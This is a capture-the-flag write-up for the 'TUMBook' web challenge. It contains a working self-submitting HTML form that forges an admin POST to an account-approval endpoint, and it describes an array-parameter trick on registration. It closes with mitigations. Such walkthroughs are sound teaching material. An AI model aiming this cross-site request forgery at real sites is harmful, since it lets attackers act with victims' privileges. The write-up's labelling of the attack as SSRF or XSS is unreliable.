---
layout: default
---
# TUMBook
## Description
Wow, is this the new Facebook? Amazing. And it even gives out free flags for its most active members. Truly revolutionary.

However, there seem to be some issues with account activation. Maybe you can contact the admin and ask for tech-support?

Hint 1: The admin uses a recent version of the Chromium browser.

Hint 2: The admin will click on links but only if their standalone.


## Overview
The website offers the following actions:
- register with username and password
- login with registered credentials
- logout
- support: Send the admin a link which he will click (rf to hint 2).

After the login one is redirected to the subpage `/flag` which states:

Your account is inactive!


The code of this challenge, again accessible, reveals that there is an endpoint to "activate" an account, but this is only accessible for admins:
```python
app.post("/approveuser", (req, res) => {
	if(req.session.is_admin) {
		console.log("Approving user", req.body.username)
		db.run('UPDATE users SET active = 1 WHERE username = ?', req.body.username);
	} else {
		console.log("Non-admin tried approving user", req.body.username)
	}
	res.redirect("/approveuser")
});
```

## Vulnerability
What we have: We can make the admin click on arbitrary urls.
What we need: The admin to make a post request to /approveuser with our own username.

This is clearly a SSRF (Server-Side request forgery) situation.

Even though it sounds quite obvious what to do, note that we need to do a *POST* request and clicking on urls are *GET* requests.

So we could change our requirement to succeed to js execution (XSS).
This should be feasible as the admin clicks on arbitrary links, also cross sites and hence we can host our own HTML code, similar to that:
```html

<!DOCTYPE html>

<html>
	<head>
		<title>Stand-alone POST to approve Username</title>
	</head>
	<body>
		<form id="autoForm" action="https://xss01.websec.sec.in.tum.de/approveuser" method="POST">
			<input type="hidden" name="username" value="Username">
		</form>
		<script>
			document.getElementById('autoForm').submit();
		</script>
	</body>
</html>
```
*note:* If you don't want to host code, you can also use a base64 encoded `data:url` instead.

This code, once visited, makes a POST request to the approveuser endpoint with our username in the context of the admin.


### Alternative (SQL)
There was also another unintended solution. 
It was unintended cause it was the vuln on purpose in the course qualification challenge, and twice would be lame.

```js
app.post('/register', (req, res) => {
	db.get("SELECT * FROM users WHERE username = ?", req.body.username, (err, row) => {
		if(row === undefined) {
			if(req.body.password == req.body.passwordv2) {
				bcrypt.hash(req.body.password, 10, function(err, hash) {
				var stmt = db.prepare('INSERT INTO users (username, password, active) VALUES (?,?,?)');
				stmt.run(req.body.username, hash, 0);
				res.redirect("/");
```

If we craft username as an array, we control `active`.
This is a weird design of arguments passing to me.



## Mitigations
The server could use CSRF tokens, which would kill the first, intended attack immediately.
Also a strict SameSite policy on cookies would help.
